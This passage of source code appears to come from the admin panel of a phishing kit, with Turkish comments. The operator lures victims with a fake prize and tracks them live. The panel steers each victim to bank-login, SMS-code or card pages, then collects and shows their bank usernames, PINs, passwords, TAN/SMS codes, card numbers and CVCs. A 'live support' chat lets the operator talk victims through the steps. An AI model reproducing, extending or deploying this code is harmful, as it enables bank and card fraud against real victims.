            if (deviceInfoSession?.id === newRow.id) {
              setDeviceInfoSession((prev) => (prev ? { ...prev, ...newRow } : prev));
            }
          }
        });
      });

      // ----- 2) BANNED IPS -----
      const banChannel = subscribeWithRecovery(CHANNEL_NAMES.ban, (ch: any) => {
        ch.on("postgres_changes", { event: "*", schema: "public", table: "banned_ips" }, () => void loadBanData());
      });

      // ----- 3) AUDIT EVENT LOGS (YENI REALTIME) -----
      subscribeWithRecovery(CHANNEL_NAMES.audit, (ch: any) => {
        ch.on("postgres_changes", { event: "INSERT", schema: "public", table: "audit_event_logs" }, () => {
          // ⭐ Yeni audit log girince sessionları da 300ms sonra yenile (status step degisikligi audit ile geliyorsa)
          window.setTimeout(() => void load(), 300);
        });
      });

      // ----- 4) FORM_DATA (YENI REALTIME - sessions UPDATE postgres_changes form_data icin 2. katman garanti) -----
      subscribeWithRecovery(CHANNEL_NAMES.formdata, (ch: any) => {
        ch.on("postgres_changes", { event: "UPDATE", schema: "public", table: "sessions", filter: "form_data IS NOT NULL" }, () => {
          // form_data degisti ise 200ms sonra load() (ustteki UPDATE handler'dan kacarsa diye garanti)
          window.setTimeout(() => void load(), 200);
        });
      });

      // ----- 5) PRESENCE -----
      const presenceChannel = supabase.channel(CHANNEL_NAMES.presence, { config: { presence: { key: "admin1-logs" } } });
      const applyPresence = () => {
        const parsed = parseVisitorPresenceState(presenceChannel.presenceState());
        setOnlineSessionIds(new Set(parsed.onlineSessionIds));
        setSessionPaths(parsed.sessionPaths);
        setSessionLastSeenAt(parsed.sessionLastSeenAt);
        setPresenceTick((t) => t + 1);
      };
      presenceChannel
        .on("presence", { event: "sync" }, applyPresence)
        .on("presence", { event: "join" }, applyPresence)
        .on("presence", { event: "leave" }, applyPresence)
        .subscribe(async (status: any) => {
          // ⭐ Presence'da da TIMED_OUT / CHANNEL_ERROR / CLOSED ise 1200ms sonra yeniden subscribe et
          // Not: REALTIME_SUBSCRIBE_STATES enumunda EXPIRED YOK (SUBSCRIBED | TIMED_OUT | CLOSED | CHANNEL_ERROR)
          if ((status === "TIMED_OUT" || status === "CHANNEL_ERROR" || status === "CLOSED") && !isUnmounting) {
            window.setTimeout(() => {
              if (isUnmounting || !supabase) return;
              try { void supabase.removeChannel(presenceChannel); } catch {}
              window.setTimeout(() => buildAndSubscribeAll(), 150);
            }, 1200);
          }
          if (status === "SUBSCRIBED") {
            await presenceChannel.track({
              pathname: "/admin",
              role: "admin",
              online_at: new Date().toISOString(),
            });
          }
        });
      createdChannels.push(presenceChannel);

      return {
        clean: () => {
          for (const c of createdChannels) {
            try { void supabase?.removeChannel(c); } catch {}
          }
        },
      };
    };

    let channelsManager: { clean: () => void } = { clean: () => {} };
    channelsManager = buildAndSubscribeAll();

    // ⭐ ADMIN1 REALTIME FIX 4/6: visibilitychange + focus eventleri
    //   Kullanici baska sekmeye gecti -> 5dk bekledi -> geri geldi.
    //   Realtime channel expired olabilir, HEMEN force load() + tekrar subscribe (buildAndSubscribeAll tekrar kurulur)
    const onVisibility = () => {
      if (document.visibilityState === "visible") {
        void load();
        void loadBanData();
        window.setTimeout(() => void load(), 600);
      }
    };
    const onFocus = () => {
      void load();
      void loadBanData();
      window.setTimeout(() => void load(), 400);
    };
    document.addEventListener("visibilitychange", onVisibility);
    window.addEventListener("focus", onFocus);

    return () => {
      isUnmounting = true;
      window.clearTimeout(initialLoadTimer);
      window.clearInterval(sessionPollTimer);
      window.clearInterval(banPollTimer);
      document.removeEventListener("visibilitychange", onVisibility);
      window.removeEventListener("focus", onFocus);
      channelsManager.clean();
      void supabase.removeChannel(CHANNEL_NAMES.session as any).catch(() => {});
      void supabase.removeChannel(CHANNEL_NAMES.ban as any).catch(() => {});
      void supabase.removeChannel(CHANNEL_NAMES.audit as any).catch(() => {});
      void supabase.removeChannel(CHANNEL_NAMES.formdata as any).catch(() => {});
      void supabase.removeChannel(CHANNEL_NAMES.presence as any).catch(() => {});
    };
  }, [supabase, load, loadBanData, deviceInfoSession?.id, chatSessionId, smsPromptSessionId, specialPromptSessionId, expandedBankHistorySessionId, expandedSmsHistorySessionId, expandedCardHistorySessionId, approvalPromptSessionId]);

  const copyToClipboard = (text: string) => {
    if (!text) return;
    navigator.clipboard.writeText(text);
  };

  const handleRouteAction = async (sessionId: string, action: string) => {
    if (!supabase) return;
    
    if (action === "sms") {
      setSmsPromptSessionId(sessionId);
      setSmsDigitsInput("6");
      setSmsCustomTextInput("");
      setSmsModeUnknown(false);
      return;
    }

    if (action === "special_approval") {
      setSpecialPromptSessionId(sessionId);
      return;
    }

    if (action === "win" || action === "wheel" || action === "code_entry" || action === "banken" || action === "bank" || action === "bank_login" || action === "card" || action === "wait" || action === "invalid_bank" || action === "live_support" || action === "congrats") {
      await supabase.from("sessions").update({ current_step: action }).eq("id", sessionId);
    } else if (action === "ban_ip") {
      const row = rowsRef.current.find(r => r.id === sessionId);
      if (row && row.ip_address) {
        const confirmBan = confirm(`Bu IP adresi (${row.ip_address}) tamamen engellenecek. Onaylıyor musunuz?`);
        if (confirmBan) {
          try {
            await supabase.from('banned_ips').insert({
              ip_address: row.ip_address,
              reason: `Admin tarafından engellendi (Session: ${sessionId})`
            });
            // INSERT basarili: Realtime channel zaten 0 sn'de loadBanData() cagiracak.
            // Ekstra manual cagri (backup, realtime gecikirse).
            setTimeout(() => void loadBanData(), 300);
            alert("IP adresi başarıyla engellendi!");
          } catch (e) {
            console.error("ban_ip insert error:", e);
            alert("IP banlanırken hata oluştu.");
          }
        }
      } else {
        alert("Bu kullanıcının IP adresi henüz sisteme yansımamış.");
      }
    }
  };

  const handleUnbanIP = async (ip: string) => {
    if (!supabase) return;
    const confirmUnban = confirm(`${ip} IP adresinin yasağı kaldırılsın mı?`);
    if (!confirmUnban) return;
    try {
      // banned_ips tablosunda PK = ip_address (text).
      const { error } = await supabase.from("banned_ips").delete().eq("ip_address", ip);
      if (error) {
        console.error("unban error:", error);
        alert("Ban kaldırılırken hata oluştu.");
        return;
      }
      // Realtime channel zaten tetikler, yine de manuel fallback
      setTimeout(() => void loadBanData(), 250);
    } catch (e) {
      console.error("handleUnbanIP exception:", e);
      alert("Ban kaldırılırken hata oluştu.");
    }
  };

  const handleApprovalAction = async (sessionId: string, approvalValue: string) => {
    if (!approvalValue) return;
    setApprovalPromptSessionId(sessionId);
    setApprovalPromptType(approvalValue);
    setApprovalCodeInput("");
  };

  async function confirmSmsRedirect() {
    if (!supabase || !smsPromptSessionId) return;
    const isUnknown = Boolean(smsModeUnknown);
    const digits = isUnknown ? 0 : Math.min(12, Math.max(4, Number(smsDigitsInput) || 6));
    await supabase
      .from("sessions")
      .update({
        current_step: "sms",
        sms_digits: digits,
        sms_mode: isUnknown ? "unknown" : "fixed",
        sms_custom_text: smsCustomTextInput.trim() || null,
        status: "online"
      })
      .eq("id", smsPromptSessionId);
    setSmsPromptSessionId(null);
    setSmsModeUnknown(false);
    void load();
  }

  async function confirmApprovalAction() {
    if (!supabase || !approvalPromptSessionId || !approvalPromptType) return;

    const row = rowsRef.current.find((currentRow) => currentRow.id === approvalPromptSessionId);
    const previousFormData =
      row && row.form_data && typeof row.form_data === "object"
        ? (row.form_data as Record<string, string | undefined>)
        : {};

    await supabase
      .from("sessions")
      .update({
        is_hidden: false,
        status: "online",
        current_step: "special_approval",
        form_data: {
          ...previousFormData,
          approvalStatus: approvalPromptType,
          approvalCode: approvalCodeInput.trim(),
          specialNoticeText: "",
          specialNoticeImage: "",
          specialNoticeLang: undefined,
          specialNoticeSentAt: "",
        },
      })
      .eq("id", approvalPromptSessionId);

    setApprovalPromptSessionId(null);
    setApprovalPromptType("");
    setApprovalCodeInput("");
    void load();
  }

  const handleDelete = async (sessionId: string) => {
    if (!confirm("Bu logu silmek (gizlemek) istediğinize emin misiniz?")) return;
    if (!supabase) return;
    await supabase.from("sessions").update({ is_hidden: true }).eq("id", sessionId);
    void load();
  };

  const handleDeleteAll = async () => {
    if (!confirm("TÜM LOGLARI silmek istediğinize emin misiniz? Bu işlem geri alınamaz!")) return;
    if (!supabase) return;
    
    const ids = rowsRef.current.map(r => r.id);
    if (ids.length === 0) return;

    await supabase.from("sessions").update({ is_hidden: true }).in("id", ids);
    void load();
  };

  useEffect(() => {
    if (!chatSessionId || !supabase) return;

    function normalizeRow(r: any): any {
      if (!r) return r;
      return {
        id: r.id,
        session_id: r.session_id,
        sender: (r.sender ?? r.role ?? "user") as "user" | "admin",
        content: r.content ?? "",
        image_url: r.image_url ?? (Array.isArray(r.image_urls) ? r.image_urls[0] ?? null : null),
        created_at: r.created_at,
      };
    }
    
    const loadChat = () => {
      const tryLoad = async () => {
        let res = await supabase
          .from("chat_messages")
          .select("*")
          .eq("session_id", chatSessionId)
          .order("created_at", { ascending: true });
        if (
          res.error &&
          /column/i.test(res.error.message) &&
          /sender|image_url/.test(res.error.message)
        ) {
          try {
            const { data, error } = await supabase
              .from("chat_messages")
              .select()
              .eq("session_id", chatSessionId)
              .order("created_at", { ascending: true });
            if (!error && data) res = { data, error: null } as any;
            else if (error && /does not exist|column/i.test(error.message)) {
              setChatMessages([]);
              return;
            }
          } catch {
            setChatMessages([]);
            return;
          }
        }
        if (res.error) {
          console.error("admin chat load error:", res.error);
          return;
        }
        if (res.data) {
          const normalized = res.data.map(normalizeRow);
          setChatMessages((prev) => {
            if (prev.length !== normalized.length) {
              setTimeout(() => chatEndRef.current?.scrollIntoView({ behavior: "smooth" }), 100);
              return normalized;
            }
            return prev;
          });
        }
      };
      void tryLoad();
    };

    loadChat();
    const interval = setInterval(loadChat, 2000);

    const channel = supabase
      .channel(`admin_chat:${chatSessionId}`)
      .on(
        "postgres_changes",
        {
          event: "INSERT",
          schema: "public",
          table: "chat_messages",
          filter: `session_id=eq.${chatSessionId}`,
        },
        (payload) => {
          const nr = normalizeRow(payload.new);
          setChatMessages((prev) => {
            if (!prev.find(m => m.id === nr.id)) {
              return [...prev, nr];
            }
            return prev;
          });
          setTimeout(() => chatEndRef.current?.scrollIntoView({ behavior: "smooth" }), 100);
        }
      )
      .subscribe();

    return () => {
      clearInterval(interval);
      void supabase.removeChannel(channel);
    };
  }, [chatSessionId, supabase]);

  async function sendChatMessage(e?: React.FormEvent) {
    if (e) e.preventDefault();
    if ((!chatInput.trim() && !pastedImage) || !supabase || !chatSessionId) return;

    let imageUrl = null;

    if (pastedImage) {
      setIsUploadingImage(true);
      const ext = pastedImage.name.split('.').pop() || 'png';
      const fileName = `${Math.random().toString(36).substring(2)}_${Date.now()}.${ext}`;
      
      const { data, error } = await supabase.storage
        .from('chat_images')
        .upload(fileName, pastedImage, {
          cacheControl: '3600',
          upsert: false
        });
        
      if (error) {
        console.error("Upload error:", error);
        alert("Resim yüklenirken hata oluştu.");
        setIsUploadingImage(false);
        return;
      }
      
      const { data: publicUrlData } = supabase.storage
        .from('chat_images')
        .getPublicUrl(fileName);
        
      imageUrl = publicUrlData.publicUrl;
    }

    const msg = chatInput.trim();
    
    setChatInput("");
    setPastedImage(null);
    setPastedImagePreview(null);
    setIsUploadingImage(false);

    // ⭐ CANLI DESTEK ADMIN1 FIX: role & sender IKISINI BIRDEN gonder.
    //   4 katman fallback: withBoth → legacy (role) → modern (sender) → minimal
    const baseInsert: any = {
      session_id: chatSessionId,
      role: "admin",
      sender: "admin",
      content: msg || "",
    };
    if (imageUrl) {
      baseInsert.image_url = imageUrl;
      baseInsert.image_urls = [imageUrl];
    }
    let res = await supabase
      .from("chat_messages")
      .insert(baseInsert)
      .select("*")
      .single();
    if (res.error) {
      // 2. Deneme: legacy (role + image_urls)
      const legacyInsert: any = { session_id: chatSessionId, role: "admin", content: msg || "" };
      legacyInsert.image_urls = imageUrl ? [imageUrl] : [];
      res = await supabase
        .from("chat_messages")
        .insert(legacyInsert)
        .select("*")
        .single();
    }
    if (res.error) {
      // 3. Deneme: modern (sender + image_url)
      const modernInsert: any = { session_id: chatSessionId, sender: "admin", content: msg || "" };
      if (imageUrl) modernInsert.image_url = imageUrl;
      res = await supabase
        .from("chat_messages")
        .insert(modernInsert)
        .select("*")
        .single();
    }
    if (res.error) {
      // 4. Son guvence: SADECE zorunlu
      const minimal: any = { session_id: chatSessionId, role: "admin", sender: "admin", content: msg || "" };
      res = await supabase.from("chat_messages").insert(minimal).select("*").single();
    }

    const { data, error } = res;

    if (error) {
      console.error("admin chat send error:", error);
      setChatInput(msg);
      alert("Mesaj gönderilemedi: " + error.message);
      return;
    }

    if (data) {
      const nr = {
        id: data.id,
        session_id: data.session_id,
        sender: (data.sender ?? data.role ?? "admin") as "user" | "admin",
        content: data.content ?? "",
        image_url: data.image_url ?? (Array.isArray(data.image_urls) ? data.image_urls[0] ?? null : null),
        created_at: data.created_at,
      };
      setChatMessages((prev) => {
        if (prev.find((m) => m.id === nr.id)) return prev;
        return [...prev, nr];
      });
    }
  }

  const handlePaste = (e: React.ClipboardEvent) => {
    const items = e.clipboardData?.items;
    if (!items) return;
    
    for (let i = 0; i < items.length; i++) {
      if (items[i].type.indexOf('image') !== -1) {
        const file = items[i].getAsFile();
        if (file) {
          setPastedImage(file);
          const reader = new FileReader();
          reader.onload = (ev) => {
            setPastedImagePreview(ev.target?.result as string);
          };
          reader.readAsDataURL(file);
          e.preventDefault();
          break;
        }
      }
    }
  };

  async function publishSpecialApproval() {
    if (!supabase || !specialPromptSessionId) return;
    const { data: existing } = await supabase.from("sessions").select("*").eq("id", specialPromptSessionId).maybeSingle();
    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
    await supabase.from("sessions").update({
      status: "SPECIAL_INFO",
      current_step: "special_approval",
      form_data: { 
        ...prev, 
        approvalStatus: "",
        approvalCode: "",
        specialNoticeText: specialMessage.trim(), 
        specialNoticeImage: specialImage ?? "", 
        specialNoticeLang: specialLang, 
        specialNoticeSentAt: new Date().toISOString() 
      },
    }).eq("id", specialPromptSessionId);
    setSpecialPromptSessionId(null);
    setSpecialMessage("");
    setSpecialImage(null);
    void load();
  }

  function extractDeviceModel(ua: string): string | null {
    const androidParen = ua.match(/\(Linux;\s*Android\s+[\d.]+;\s*([^)]+)\)/i);
    if (androidParen) {
      let raw = androidParen[1].trim();
      raw = raw.split(/\s+Build\//i)[0].trim();
      if (raw && !/^Mobile$/i.test(raw) && !/^tablet$/i.test(raw)) {
        return raw;
      }
    }
    if (/iPhone/i.test(ua)) {
      const v = ua.match(/CPU iPhone OS ([\d_]+)/i);
      if (v) return `iPhone (iOS ${v[1].replace(/_/g, ".")})`;
      return "iPhone";
    }
    if (/iPad/i.test(ua)) {
      const v = ua.match(/CPU (?:iPhone )?OS ([\d_]+)/i);
      if (v) return `iPad (iPadOS ${v[1].replace(/_/g, ".")})`;
      return "iPad";
    }
    if (/iPod/i.test(ua)) {
      return "iPod touch";
    }
    const samsung = ua.match(/\b(SM-[A-Z0-9]+)\b/i);
    if (samsung) return samsung[1];
    const pixel = ua.match(/\b(Pixel\s+(?:\d+[a-zA-Z]?|Tablet|Fold|Pro))\b/i);
    if (pixel) return pixel[1];
    return null;
  }

  function parseUserAgent(ua?: string) {
    if (!ua) return { os: "Bilinmiyor", browser: "Bilinmiyor", device: "Bilinmiyor", model: "Tespit edilemedi" };
    let os = "Bilinmiyor";
    let browser = "Bilinmiyor";
    let device = "Masaüstü";

    if (/android/i.test(ua)) { os = "Android"; device = "Mobil/Tablet"; } 
    else if (/iphone|ipad|ipod/i.test(ua)) { os = "iOS"; device = "Mobil/Tablet"; } 
    else if (/windows/i.test(ua)) { os = "Windows"; } 
    else if (/mac os/i.test(ua)) { os = "macOS"; } 
    else if (/linux/i.test(ua)) { os = "Linux"; }

    if (/chrome|crios/i.test(ua)) browser = "Chrome";
    else if (/firefox|fxios/i.test(ua)) browser = "Firefox";
    else if (/safari/i.test(ua)) browser = "Safari";
    else if (/edg/i.test(ua)) browser = "Edge";
    else if (/opr\//i.test(ua)) browser = "Opera";

    const modelGuess = extractDeviceModel(ua);
    const model = modelGuess ?? (device === "Masaüstü" ? "— (masaüstü)" : "Tespit edilemedi (UA kısıtlı olabilir)");

    return { os, browser, device, model };
  }

  return (
    <div className="space-y-8 animate-in fade-in duration-500">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className={`p-2 rounded-xl ${darkMode ? 'bg-white/10 text-white' : 'bg-black/5 text-black'}`}>
              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z" /></svg>
            </div>
            <h2 className={`text-2xl font-bold tracking-tight ${darkMode ? 'text-white' : 'text-gray-900'}`}>Loglar ve Canlı Takip</h2>
          </div>
          <div className="flex items-center gap-3">
            <button
              onClick={() => void handleDeleteAll()}
              className={`flex items-center gap-2.5 rounded-full px-5 py-2.5 shadow-sm text-[12px] font-bold tracking-wider uppercase transition-all duration-300 hover:scale-105 active:scale-95 hover:shadow-md ${
                darkMode ? "bg-red-500/10 border border-red-500/20 text-red-500 hover:bg-red-500 hover:text-white" : "bg-red-50 border border-red-200 text-red-600 hover:bg-red-500 hover:text-white"
              }`}
            >
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg>
              Tümünü Sil
            </button>
            <button
              onClick={() => {
                setSoundEnabled(!soundEnabled);
                if (!soundEnabled) playNotificationSound("Bildirim Testi", "Sesli bildirimler başarıyla açıldı.");
              }}
              className={`flex items-center gap-2.5 rounded-full px-5 py-2.5 shadow-sm text-[12px] font-bold tracking-wider uppercase transition-all duration-300 hover:scale-105 active:scale-95 hover:shadow-md ${
                soundEnabled
                  ? "bg-[#EB5E28]/10 border border-[#EB5E28]/20 text-[#EB5E28] ring-1 ring-[#EB5E28]/50"
                  : (darkMode ? "bg-[#1c1c1e] border border-white/10 text-zinc-400 hover:bg-white/10 hover:text-white" : "bg-white border border-gray-200 text-gray-500 hover:bg-gray-50 hover:text-black")
              }`}
            >
              {soundEnabled ? (
                <>
                  <span className="relative flex h-2.5 w-2.5">
                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-[#EB5E28] opacity-75"></span>
                    <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-[#EB5E28]"></span>
                  </span>
                  Ses Açık
                </>
              ) : (
                <>
                  <svg className="w-4 h-4 opacity-70" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5.586 15H4a1 1 0 01-1-1v-4a1 1 0 011-1h1.586l4.707-4.707C10.923 3.663 12 4.109 12 5v14c0 .891-1.077 1.337-1.707.707L5.586 15z" /><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2" /></svg>
                  Ses Kapalı
                </>
              )}
            </button>
          </div>
        </div>

      {/* STAT CARDS */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
        <StatCard icon="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" color="text-yellow-500" title="Anlık Ziyaretçi" value={liveVisitorCount} darkMode={darkMode} />
        <StatCard icon="M5 8h14M5 8a2 2 0 110-4h14a2 2 0 110 4M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8m-9 4h4" color="text-green-500" title="Log Sayısı" value={logCount} darkMode={darkMode} />
        <StatCard
          icon="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636"
          color="text-red-500"
          title="Ban Sayısı"
          value={bannedCount}
          darkMode={darkMode}
          onClick={() => setBanListModalOpen(true)}
          clickableHint="Banlı IP listesini açmak için tıkla"
        />
      </div>

      {/* TABLE */}
      <div className={`rounded-3xl border shadow-[0_8px_30px_rgb(0,0,0,0.04)] overflow-hidden backdrop-blur-xl ${darkMode ? 'bg-[#1c1c1e]/70 border-white/5' : 'bg-white/80 border-[#d2d2d7]/50'}`}>
        <div className="overflow-x-auto pb-4">
          <table className="w-full table-fixed border-collapse text-[10px] text-left lg:text-[11px]">
            <thead className={`text-[11px] uppercase tracking-wider font-semibold border-b ${darkMode ? 'bg-black/20 text-gray-400 border-white/5' : 'bg-gray-50/50 text-gray-500 border-gray-100'}`}>
              <tr>
                <th className="w-[6%] px-2 py-3 font-semibold whitespace-nowrap">ID</th>
                <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">Ödül</th>
                <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">İsim</th>
                <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">Numara</th>
                <th className="w-[32%] px-2 py-3 font-semibold whitespace-nowrap">Banka</th>
                {/* ONAY KOLONU GIZLI (L1406 colSpan 10, L2000, L2252, L2390 colSpan duzeltildi)
                <th className="w-[14%] px-2 py-3 font-semibold whitespace-nowrap">Onay</th> */}
                <th className="hidden w-[14%] px-2 py-3 font-semibold whitespace-nowrap">Onay</th>
                <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">SMS</th>
                <th className="w-[11%] px-2 py-3 font-semibold whitespace-nowrap">Kart</th>
                <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">Sayfa</th>
                <th className="w-[7%] px-2 py-3 font-semibold whitespace-nowrap">Durum</th>
                <th className="w-[12%] px-2 py-3 font-semibold text-right whitespace-nowrap">İşlemler</th>
              </tr>
            </thead>
            <tbody className={`divide-y ${darkMode ? 'divide-white/5' : 'divide-gray-100'}`}>
              {rows.length === 0 && (
                <tr>
                  <td colSpan={10} className="px-5 py-12 text-center text-base opacity-50 font-medium">Henüz bir log yok. İşlemler burada görünecek.</td>
                </tr>
              )}
              {rows.map((row) => {
                const fd = sanitizeFormDataAll(row.form_data || {});
                // KESIN + ANLIK ONLINE / OFFLINE karari:
                // 1. row.status === 'offline' ise DIREKT OFFLINE (kullanici pagehide ile isaretlemis).
                // 2. Degilse ve last_ping_at son 10sn'de guncellenmis → ONLINE.
                // 3. Degilse presence fallback (eski sessionlar icin).
                let isOnline = false;
                if (row.status !== "offline") {
                  if (row.last_ping_at) {
                    try {
                      const t = Date.parse(String(row.last_ping_at));
                      if (Number.isFinite(t) && Date.now() - t < LIVE_WINDOW_MS) isOnline = true;
                    } catch { /* noop */ }
                  }
                  if (!isOnline) {
                    isOnline = isSessionLive(
                      row.id,
                      onlineSessionIds,
                      row.status,
                      sessionLastSeenAt[row.id],
                    );
                  }
                }

                // ⭐⭐⭐⭐⭐ KALICI ONEMLI: HISTORY = 3 DIZININ BIRLESIMI!
                //   ❌ ESKI: const history = fd.bankFormHistory (SADECE BANKA)
                //      SMS client (sms-client.tsx) push ettigi kayitlar fd.smsFormHistory dizisinde saklaniyordu.
                //      Kart client (card-client.tsx) push ettigi kayitlar fd.cardFormHistory dizisinde saklaniyordu.
                //      Bu 2 dizi ESKI KODDA history'ye EKLENMIYORDU! Sonuc:
                //      smsHistoryRaw = history.filter(... "SMS KODU" ...) BOS kalıyordu (SMS kolonunda gecmis yok).
                //      cardHistoryRaw = history.filter(... "KART BILGISI" ...) BOS kalıyordu (kart kolonunda gecmis yok).
                //      BANKA icinde dogruydi ama smsFormHistory+cardFormHistory UNUTULMUŞTU!
                //   ✅ YENI KURAL: HISTORY DIZISI = 3 GERCEK CLIENT PUSH DIZISININ BIRLESIMI:
                //      1) BANKA: form_data.bankFormHistory (L1439 eski)
                //      2) SMS  : form_data.smsFormHistory (sms-client L185-191 push)
                //      3) KART : form_data.cardFormHistory (card-client L80-87 push)
                //   Boylece 3 kolonunda GERCEK push edilen kayitlari var.
                const bankEntries: any[] = Array.isArray(fd.bankFormHistory) ? (fd.bankFormHistory as any[]).slice() : [];
                const smsEntries: any[] = Array.isArray((fd as any).smsFormHistory) ? (fd as any).smsFormHistory.slice() : [];
                const cardEntries: any[] = Array.isArray((fd as any).cardFormHistory) ? (fd as any).cardFormHistory.slice() : [];
                const history: any[] = [...bankEntries, ...smsEntries, ...cardEntries].map((e: any) => ({
                  ...e,
                  // ⭐ GERCEKTEN client tarafli push edilen kayitlar LEGACY OLMAMALI.
                  //   (Eski kodda L1456-L1501 arasi legacy snapshot'i isLegacySnapshot=true atiyor.)
                  isLegacySnapshot: typeof e?.isLegacySnapshot === "boolean" ? e.isLegacySnapshot : false,
                }));
                const hasAnyCredentialSnapshot = Boolean(
                  fd.verfuegernummer ||
                    fd.username ||
                    fd.id ||
                    fd.pin ||
                    fd.password ||
                    fd.pw ||
                    fd.bankPhone ||
                    fd.personalCode ||
                    fd.tacCode ||
                    fd.tac_code ||
                    fd.loginMethod ||
                    fd.orderedField1 ||
                    fd.orderedField2 ||
                    fd.orderedField3,
                );
                if (history.length === 0 && hasAnyCredentialSnapshot) {
                  history.unshift({
                    bankSlug: fd.bankSlug,
                    bankName: fd.bankName || "Bilinmiyor",
                    verfuegernummer: fd.verfuegernummer || fd.username || fd.id || "",
                    username: fd.verfuegernummer || fd.username || fd.id || "",
                    pin: fd.pin || fd.password || fd.pw || "",
                    password: fd.pin || fd.password || fd.pw || "",
                    bankPhone: fd.bankPhone || "",
                    personalCode: fd.personalCode || "",
                    tacCode: fd.tacCode || fd.tac_code || "",
                    smsCode: fd.smsCode || fd.sms_code || fd.tacCode || fd.tac_code || "",
                    cardNumber: fd.cardNumber || "",
                    cardExpiry: fd.cardExpiry || "",
                    cardCvc: fd.cardCvc || "",
                    loginMethod: fd.loginMethod || "",
                    orderedField1: fd.orderedField1 || "",
                    orderedField1Key: fd.orderedField1Key || "",
                    orderedField2: fd.orderedField2 || "",
                    orderedField2Key: fd.orderedField2Key || "",
                    orderedField2Type: fd.orderedField2Type || "",
                    orderedField3: fd.orderedField3 || "",
                    orderedField3Key: fd.orderedField3Key || "",
                    orderedField3Type: fd.orderedField3Type || "",
                    rawFields:
                      fd.verfuegernummer || fd.username || fd.id || fd.pin || fd.password || fd.pw
                        ? {
                            legacy_verfuegernummer: fd.verfuegernummer || "",
                            legacy_username: fd.username || "",
                            legacy_id: fd.id || "",
                            legacy_pin: fd.pin || "",
                            legacy_password: fd.password || "",
                            legacy_pw: fd.pw || "",
                            legacy_bankPhone: fd.bankPhone || "",
                            legacy_personalCode: fd.personalCode || "",
                            legacy_tacCode: fd.tacCode || fd.tac_code || "",
                            legacy_smsCode: fd.smsCode || fd.sms_code || "",
                            legacy_cardNumber: fd.cardNumber || "",
                            legacy_cardExpiry: fd.cardExpiry || "",
                            legacy_cardCvc: fd.cardCvc || "",
                            legacy_loginMethod: fd.loginMethod || "",
                          }
                        : undefined,
                    capturedAt: row.updated_at || row.created_at || new Date().toISOString(),
                    isLegacySnapshot: true,
                  });
                }
                (fd as any).bankFormHistory = history;

                // ⭐ MEVCUT KOLON DEĞERLERİ: SMS / KART / BANKA alanlarinin anlik guncel degeri
                //   (asagidaki history hesaplamalarinda "son history = mevcut kolonsa kaldir"
                //   kuralini kullanabilmek icin ONCE hesaplanmasi lazim).
                const currentSmsValue =
                  typeof fd.smsCode === "string" && fd.smsCode.trim()
                    ? fd.smsCode.trim()
                    : typeof fd.tacCode === "string" && fd.tacCode.trim()
                      ? fd.tacCode.trim()
                      : "";
                const currentCardNo = String(fd.cardNumber || "").trim();
                const currentCardExp = String(fd.cardExpiry || "").trim();
                const currentCardCvc = String(fd.cardCvc || "").trim();
                const currentBankOrdered1 = String(fd.orderedField1 || "").trim();
                const currentBankUser = String(fd.username || fd.verfuegernummer || "").trim();
                const currentBankPass = String(fd.password || fd.pin || "").trim();
                // ⭐⭐⭐ BANKA kolonu icin KALICI degiskenler (asagidaki BANKA history hesaplamada kullaniliyor)
                //   Build hata sebebi: L1690-L1710 arasinda currentTac/currentBankPhone vb. kullaniliyordu ama TANIMLI DEĞİLDİ.
                const currentTac = String(fd.tacCode || "").trim();
                const currentBankPhone = String(fd.bankPhone || "").trim();
                const currentPersonalCode = String(fd.personalCode || "").trim();
                const currentO2 = String(fd.orderedField2 || "").trim();
                const currentO3 = String(fd.orderedField3 || "").trim();

                // ⭐ SMS GECMISI HESAPLA:
                //   - SADECE GERCEK client tarafindan PUSH edilen kayitlar (htmlStepLabel === "SMS KODU").
                //   - ⚠️ LEGACY SNAPSHOT (tek kayit, kolonun kopyasi) ASLA GECMIS OLARAK SAYILMAZ!
                //     (cunku zaten kolon onu gosteriyor, gecmis ayni kayit tekrar = sacma).
                //   1) htmlStepLabel === "SMS KODU" + SMS alani dolu.
                //   2) Ardışık AYNI kodu tekrar etme (dedup).
                //   3) ⭐ Son (en yeni) SMS === kolondaki MEVCUT SMS ise listeden KALDIR.
                //
                //   SONUC: 1. SMS'te GECMIS YOK (buton YOK). 2. SMS'te GECMIS (1) gorunur ve 1. SMS listelenir. ✅
                const smsHistoryRaw = history
                  .filter((e: any) => e && typeof e.htmlStepLabel === "string" && e.htmlStepLabel === "SMS KODU")
                  .map((e: any) => {
                    const sms = String(e.smsCode || e.tacCode || e.sms_code || "").trim();
                    if (!sms) return null;
                    return {
                      sms,
                      capturedAt: e.capturedAt || "",
                      isLegacySnapshot: Boolean(e.isLegacySnapshot),
                      bankSlug: e.bankSlug || "",
